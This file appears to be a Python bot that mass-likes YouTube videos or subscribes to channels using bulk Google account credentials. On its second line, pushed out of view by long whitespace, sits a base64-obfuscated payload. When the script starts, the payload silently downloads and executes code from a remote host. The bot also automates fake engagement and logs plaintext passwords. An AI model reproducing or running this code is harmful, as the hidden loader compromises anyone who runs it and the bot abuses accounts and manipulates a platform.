from builtins import *
type('Hello world!')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9tVGJLdTZFMEpwcW9ZM2tvJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
from lib.multi import Threader
from lib.auth import *
import lib.execption as err
import lib.action as YT
import lib.cli as cli
import threading
import signal


cli.banner()

action        = cli.ask_action()
threader      = Threader(cli.ask_threads())
accounts_path = cli.ask_accounts_file()
action_path   = cli.ask_action_file()

slogin   = 0
flogin   = 0
saction  = 0
faction  = 0

clock    = threading.Lock()
lock     = threading.Lock()

botgaurd = Botgaurd()
server   = botgaurd.server_start()

def counters(name,value=1):
	global slogin
	global flogin
	global saction
	global faction
	global clock
	mapping = {
		'login-t':  'slogin',
		'login-f':  'flogin',
		'action-t': 'saction',
		'action-f': 'faction',
	}
	with clock:
		globals()[mapping[name]] += value
		cli.show_status(slogin, flogin, saction, faction)

def youtube_session(email,password):
	try:

		authenticator = GAuth(email, password)
		authenticator.set_botguard_server(server)
		google = authenticator.Glogin()
		status = authenticator.ServiceLogin('youtube','https://www.youtube.com/signin?app=desktop&next=%2F&hl=en&action_handle_signin=true')
		counters('login-t')
		return status

	except err.LoginFailed:
		counters('login-f')
		return -1

def like_wrapper(email,password,video_id):
	session = youtube_session(email, password)

	if session == -1:
		cli.debug("Like: [%s:%s]:UNAUTH -> %s:0" %(email,password,video_id) )
		counters('login-f')
		return "unauthenticated"
	
	status = YT.like(video_id, session)
	counters('action-t') if status == 1 else counters('action-f')

	cli.debug("Like: [%s]:LOGGED -> %s:%i" %(email,video_id,status))

def subscribe_wrapper(email,password,channel_id):
	session = youtube_session(email, password)

	if session == -1:
		cli.debug("Sub: [%s:%s]:UNAUTH -> %s:0" %(email,password,channel_id) )
		counters('action-f')
	return "authenticated"

	status = YT.subscribe(channel_id, session)
	counters('action-t') if status == 1 else counters('action-f')

	cli.debug("Sub: [%s]:LOGGED -> %s:%i" %(email,channel_id,status))

def on_exit(sig, frame):
	botgaurd.server_shutdown()
	cli.sys.exit(0)

signal.signal(signal.SIGINT, on_exit)

for identifier in cli.read_action_file(action_path):
	for credentials in cli.read_acounts_file(accounts_path):

		if action == "l":
			threader.put(like_wrapper,[credentials[0],credentials[1],identifier])
		elif action == "s":
			threader.put(subscribe_wrapper,[credentials[0],credentials[1],identifier])

threader.finish_all()
botgaurd.server_shutdown()